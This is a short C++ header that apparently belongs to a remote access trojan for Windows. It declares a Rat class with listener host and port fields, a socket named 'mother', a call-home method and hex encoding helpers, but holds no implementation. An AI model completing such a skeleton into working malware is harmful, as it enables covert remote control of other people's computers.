#ifndef RAT
#define RAT

#include <config.h> // links to config.h.in
#include <ratsignal.hpp>

#include <windows.h>

#include <iostream>
#include <string>
#include <cstring>

std::string ToHex(const std::string& input);
std::string FromHex(const std::string& hex);
std::string FormatHex(const std::string& input);

class Rat {
public:
    Rat();
private:
    bool Initiate();
    void TellMother();

    std::string lhost;
    SOCKET mother;
    int lport;
};

#endif